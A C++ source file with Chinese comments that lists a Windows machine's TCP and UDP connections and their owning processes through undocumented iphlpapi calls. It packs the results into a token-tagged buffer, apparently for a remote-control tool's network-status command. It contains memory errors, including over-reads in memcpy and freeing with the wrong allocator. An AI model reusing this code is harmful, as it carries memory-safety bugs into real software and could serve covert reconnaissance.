// GetNetState.cpp: implementation of the CGetNetState class.
//
//////////////////////////////////////////////////////////////////////
// #include "StdAfx.h"
#include "GetNetState.h"

 //////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#include "../../common/macros.h"
LPBYTE getNetStateList()
{
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_NSLIST;
	DWORD			dwOffset = 1;
	DWORD   dwLength = 0;



    // 定义扩展函数指针     
    PFNAllocateAndGetTcpExTableFromStack pAllocateAndGetTcpExTableFromStack;     
    PFNAllocateAndGetUdpExTableFromStack pAllocateAndGetUdpExTableFromStack;     
	
    // 获取扩展函数的入口地址       
    HMODULE hModule = ::LoadLibrary("iphlpapi.dll");     
    pAllocateAndGetTcpExTableFromStack =      
		(PFNAllocateAndGetTcpExTableFromStack)::GetProcAddress(hModule,      
		"AllocateAndGetTcpExTableFromStack");     
	
    pAllocateAndGetUdpExTableFromStack =      
		(PFNAllocateAndGetUdpExTableFromStack)::GetProcAddress(hModule,      
		"AllocateAndGetUdpExTableFromStack");     
	
    if(pAllocateAndGetTcpExTableFromStack != NULL || pAllocateAndGetUdpExTableFromStack != NULL)     
    {     
		// 调用扩展函数，获取TCP扩展连接表和UDP扩展监听表     
		
		PMIB_TCPEXTABLE pTcpExTable;     
		PMIB_UDPEXTABLE pUdpExTable;     
		
		// pTcpExTable和pUdpExTable所指的缓冲区自动由扩展函数在进程堆中申请     
		if(pAllocateAndGetTcpExTableFromStack(&pTcpExTable, TRUE, GetProcessHeap(), 2, 2) != 0)     
		{     
            return NULL;     
		}     
		if(pAllocateAndGetUdpExTableFromStack(&pUdpExTable, TRUE, GetProcessHeap(), 2, 2) != 0)     
		{     
            return NULL;     
		}     
		
		// 给系统内的所有进程拍一个快照     
		HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);     
		if(hProcessSnap == INVALID_HANDLE_VALUE)     
		{     
			return NULL;     
		}     
		
		char    szLocalAddr[128];     
		char    szRemoteAddr[128];     
		char    szProcessName[128];     
		in_addr inadLocal, inadRemote;     
		char    strState[128];     
		DWORD   dwRemotePort = 0;        
		
		// 打印TCP扩展连接表信息     
		for(UINT i = 0; i < pTcpExTable->dwNumEntries; ++i)     
		{     
			// 状态     
			switch (pTcpExTable->table[i].dwState)     
			{     
			case MIB_TCP_STATE_CLOSED:     
				strcpy(strState, "已关闭");     
				break;     
			case MIB_TCP_STATE_TIME_WAIT:     
				strcpy(strState, "等待连接");     
				break;     
			case MIB_TCP_STATE_LAST_ACK:     
				strcpy(strState, "LAST_ACK");     
				break;     
			case MIB_TCP_STATE_CLOSING:     
				strcpy(strState, "正在关闭");     
				break;     
			case MIB_TCP_STATE_CLOSE_WAIT:     
				strcpy(strState, "等待关闭");     
				break;     
			case MIB_TCP_STATE_FIN_WAIT1:     
				strcpy(strState, "FIN_WAIT1");     
				break;     
			case MIB_TCP_STATE_ESTAB:     
				strcpy(strState, "建立");     
				break;     
			case MIB_TCP_STATE_SYN_RCVD:     
				strcpy(strState, "SYN_接收");     
				break;     
			case MIB_TCP_STATE_SYN_SENT:     
				strcpy(strState, "SYN_发送");     
				break;     
			case MIB_TCP_STATE_LISTEN:     
				strcpy(strState, "监听");     
				break;     
			case MIB_TCP_STATE_DELETE_TCB:     
				strcpy(strState, "删除");     
				break;     
			default:     
				break;     
			}     
			// 本地IP地址     
			inadLocal.s_addr = pTcpExTable->table[i].dwLocalAddr;     
			
			// 远程端口     
			if(strcmp(strState, "监听") != 0)     
			{     
				dwRemotePort = pTcpExTable->table[i].dwRemotePort;     
			}     
			else 
				dwRemotePort = 0;     
			
			// 远程IP地址     
			inadRemote.s_addr = pTcpExTable->table[i].dwRemoteAddr;     
			
			
			wsprintf(szLocalAddr, "%s:%u", inet_ntoa(inadLocal),      
				ntohs((unsigned short)(0x0000FFFF & pTcpExTable->table[i].dwLocalPort)));     
			wsprintf(szRemoteAddr, "%s:%u", inet_ntoa(inadRemote),      
				ntohs((unsigned short)(0x0000FFFF & dwRemotePort)));     
			
			// 打印出此入口的信息
			char strProcessName[100] = {0};
			char * strType = "[TCP]";
			lstrcpy(strProcessName,ProcessPidToName(hProcessSnap, pTcpExTable->table[i].dwProcessId, szProcessName));
			

			dwLength = lstrlen(strProcessName) + sizeof(DWORD) + lstrlen(strType) + lstrlen(szLocalAddr) + lstrlen(szRemoteAddr) + lstrlen(strState) + 6;
			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
			
			
			memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
			dwOffset += lstrlen(strProcessName) + 1;

			memcpy(lpBuffer + dwOffset, &pTcpExTable->table[i].dwProcessId, sizeof(DWORD) + 1);
			dwOffset += sizeof(DWORD) + 1;

			memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) + 1);
			dwOffset += lstrlen(strType) + 1;
			
			memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) + 1);
			dwOffset += lstrlen(szLocalAddr) + 1;

			memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) + 1);
			dwOffset += lstrlen(szRemoteAddr) + 1;

			memcpy(lpBuffer + dwOffset, strState, lstrlen(strState) + 1);
			dwOffset += lstrlen(strState) + 1;

		}     
		
		// 打印UDP监听表信息     
		for(i = 0; i < pUdpExTable->dwNumEntries; ++i)     
		{     
			// 本地IP地址     
			inadLocal.s_addr = pUdpExTable->table[i].dwLocalAddr;     
			
			wsprintf(szLocalAddr,  "%s:%u", inet_ntoa(inadLocal),      
                ntohs((unsigned short)(0x0000FFFF & pUdpExTable->table[i].dwLocalPort)));     
			
			// 打印出此入口的信息     
			char strProcessName[100] = {0};
			char * strType = "[UDP]";
			char * szRemoteAddr = "*.*.*.*:*";
			char * szUDPState  = " ";
 			lstrcpy(strProcessName,ProcessPidToName(hProcessSnap, pUdpExTable->table[i].dwProcessId, szProcessName));


			dwLength = lstrlen(strProcessName) + sizeof(DWORD) + lstrlen(strType) + lstrlen(szLocalAddr) + lstrlen(szRemoteAddr) + lstrlen(szUDPState) + 6;

			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
			
			
			memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
			dwOffset += lstrlen(strProcessName) + 1;
			
			memcpy(lpBuffer + dwOffset, &	pUdpExTable->table[i].dwProcessId , sizeof(DWORD) + 1);
			dwOffset += sizeof(DWORD) + 1;
			
			memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) + 1);
			dwOffset += lstrlen(strType) + 1;
			
			memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) + 1);
			dwOffset += lstrlen(szLocalAddr) + 1;
			
			memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) + 1);
			dwOffset += lstrlen(szRemoteAddr) + 1;
			
			memcpy(lpBuffer + dwOffset, szUDPState, lstrlen(szUDPState) + 1);
			dwOffset += lstrlen(szUDPState) + 1;


			
		}     
		::CloseHandle(hProcessSnap);     
		::LocalFree(pTcpExTable);     
		::LocalFree(pUdpExTable);     
		::FreeLibrary(hModule);   
    }
	else
	{

		char    szLocalAddr[128];     
		char    szRemoteAddr[128];     
		char    szProcessName[128];     
		in_addr inadLocal, inadRemote;     
		char    strState[128];     
		DWORD   dwRemotePort = 0;    

		PMIB_TCPEXTABLE_VISTA pTcpTable_Vista;
		_InternalGetTcpTable2 pGetTcpTable = (_InternalGetTcpTable2)GetProcAddress(hModule,"InternalGetTcpTable2");
		if (pGetTcpTable == NULL)
			return 0;
		
		if (pGetTcpTable(&pTcpTable_Vista,GetProcessHeap(),1))
			return 0;


		// 给系统内的所有进程拍一个快照     
		HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);     
		if(hProcessSnap == INVALID_HANDLE_VALUE)     
		{     
			return NULL;     
		}    


		for (UINT i=0;i<pTcpTable_Vista->dwNumEntries;i++)
		{
			// 状态     
			switch (pTcpTable_Vista->table[i].dwState)     
			{     
			case MIB_TCP_STATE_CLOSED:     
				strcpy(strState, "CLOSED");     
				break;     
			case MIB_TCP_STATE_TIME_WAIT:     
				strcpy(strState, "TIME_WAIT");     
				break;     
			case MIB_TCP_STATE_LAST_ACK:     
				strcpy(strState, "LAST_ACK");     
				break;     
			case MIB_TCP_STATE_CLOSING:     
				strcpy(strState, "CLOSING");     
				break;     
			case MIB_TCP_STATE_CLOSE_WAIT:     
				strcpy(strState, "CLOSE_WAIT");     
				break;     
			case MIB_TCP_STATE_FIN_WAIT1:     
				strcpy(strState, "FIN_WAIT1");     
				break;     
			case MIB_TCP_STATE_ESTAB:     
				strcpy(strState, "ESTAB");     
				break;     
			case MIB_TCP_STATE_SYN_RCVD:     
				strcpy(strState, "SYN_RCVD");     
				break;     
			case MIB_TCP_STATE_SYN_SENT:     
				strcpy(strState, "SYN_SENT");     
				break;     
			case MIB_TCP_STATE_LISTEN:     
				strcpy(strState, "LISTEN");     
				break;     
			case MIB_TCP_STATE_DELETE_TCB:     
				strcpy(strState, "DELETE");     
				break;     
			default:     
				break;     
			}     
			// 本地IP地址     
			inadLocal.s_addr = pTcpTable_Vista->table[i].dwLocalAddr;     
			
			// 远程端口     
			if(strcmp(strState, "LISTEN") != 0)     
			{     
				dwRemotePort = pTcpTable_Vista->table[i].dwRemotePort;     
			}     
			else 
				dwRemotePort = 0;     
			
			// 远程IP地址     
			inadRemote.s_addr = pTcpTable_Vista->table[i].dwRemoteAddr;     
			
			
			wsprintf(szLocalAddr, "%s:%u", inet_ntoa(inadLocal),      
				ntohs((unsigned short)(0x0000FFFF & pTcpTable_Vista->table[i].dwLocalPort)));     
			wsprintf(szRemoteAddr, "%s:%u", inet_ntoa(inadRemote),      
				ntohs((unsigned short)(0x0000FFFF & dwRemotePort)));     
			
			// 打印出此入口的信息    
			char strProcessName[100] = {0};
			char * strType = "[TCP]";
			lstrcpy(strProcessName,ProcessPidToName(hProcessSnap, pTcpTable_Vista->table[i].dwProcessId, szProcessName));
			
			
			dwLength = lstrlen(strProcessName) + sizeof(DWORD) + lstrlen(strType) + lstrlen(szLocalAddr) + lstrlen(szRemoteAddr) + lstrlen(strState) + 6;
			if (LocalSize(lpBuffer) < (dwOffset + dwLength))
				lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
			
			
			memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
			dwOffset += lstrlen(strProcessName) + 1;
			
			memcpy(lpBuffer + dwOffset, &pTcpTable_Vista->table[i].dwProcessId, sizeof(DWORD) + 1);
			dwOffset += sizeof(DWORD) + 1;
			
			memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) + 1);
			dwOffset += lstrlen(strType) + 1;
			
			memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) + 1);
			dwOffset += lstrlen(szLocalAddr) + 1;
			
			memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) + 1);
			dwOffset += lstrlen(szRemoteAddr) + 1;
			
			memcpy(lpBuffer + dwOffset, strState, lstrlen(strState) + 1);
			dwOffset += lstrlen(strState) + 1;


		}


		PMIB_UDPEXTABLE pUdpExTable = NULL;  
		// 表明为 Vista 或者 7 操作系统  
		PFNInternalGetUdpTableWithOwnerPid pInternalGetUdpTableWithOwnerPid;  
		pInternalGetUdpTableWithOwnerPid =   
			(PFNInternalGetUdpTableWithOwnerPid)GetProcAddress(hModule, "InternalGetUdpTableWithOwnerPid");  
		if (pInternalGetUdpTableWithOwnerPid != NULL)  
		{  
			if (pInternalGetUdpTableWithOwnerPid(&pUdpExTable, GetProcessHeap(), 1))  
			{  
				if (pUdpExTable)  
				{  
					HeapFree(GetProcessHeap(), 0, pUdpExTable);  
				}  
				
				FreeLibrary(hModule);  
				hModule = NULL;  
				
				return 0;  
            }  
			
			// 打印UDP监听表信息     
			for(i = 0; i < pUdpExTable->dwNumEntries; ++i)     
			{     
				// 本地IP地址     
				inadLocal.s_addr = pUdpExTable->table[i].dwLocalAddr;     
				
				wsprintf(szLocalAddr,  "%s:%u", inet_ntoa(inadLocal),      
					ntohs((unsigned short)(0x0000FFFF & pUdpExTable->table[i].dwLocalPort)));     
				
				// 打印出此入口的信息
				char strProcessName[100] = {0};
				char * strType = "[UDP]";
				char * szRemoteAddr = "*.*.*.*:*";
				char * szUDPState  = " ";
				lstrcpy(strProcessName,ProcessPidToName(hProcessSnap, pUdpExTable->table[i].dwProcessId, szProcessName));
				
				
				dwLength = lstrlen(strProcessName) + sizeof(DWORD) + lstrlen(strType) + lstrlen(szLocalAddr) + lstrlen(szRemoteAddr) + lstrlen(szUDPState) + 6;
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
			
				
				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;
				
				memcpy(lpBuffer + dwOffset, &pUdpExTable->table[i].dwProcessId , sizeof(DWORD) + 1);
				dwOffset += sizeof(DWORD) + 1;
				
				memcpy(lpBuffer + dwOffset, strType, lstrlen(strType) + 1);
				dwOffset += lstrlen(strType) + 1;
				
				memcpy(lpBuffer + dwOffset, szLocalAddr, lstrlen(szLocalAddr) + 1);
				dwOffset += lstrlen(szLocalAddr) + 1;
				
				memcpy(lpBuffer + dwOffset, szRemoteAddr, lstrlen(szRemoteAddr) + 1);
				dwOffset += lstrlen(szRemoteAddr) + 1;
				
				memcpy(lpBuffer + dwOffset, szUDPState, lstrlen(szUDPState) + 1);
		    	dwOffset += lstrlen(szUDPState) + 1;
				
			}   
		}
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);


	return lpBuffer;
}

// 将进程ID号（PID）转化为进程名称     
PCHAR ProcessPidToName(HANDLE hProcessSnap, DWORD ProcessId, PCHAR ProcessName)     
{     
    PROCESSENTRY32 processEntry;     
    processEntry.dwSize = sizeof(processEntry);     
    // 找不到的话，默认进程名为“???”     
    strcpy(ProcessName, "???");     
    if(!::Process32First(hProcessSnap, &processEntry))      
        return ProcessName;     
    do  
    {     
        if(processEntry.th32ProcessID == ProcessId) // 就是这个进程     
        {     
            strcpy(ProcessName, processEntry.szExeFile);     
            break;     
        }     
    }     
    while(::Process32Next(hProcessSnap, &processEntry));     
    return ProcessName;     
}

 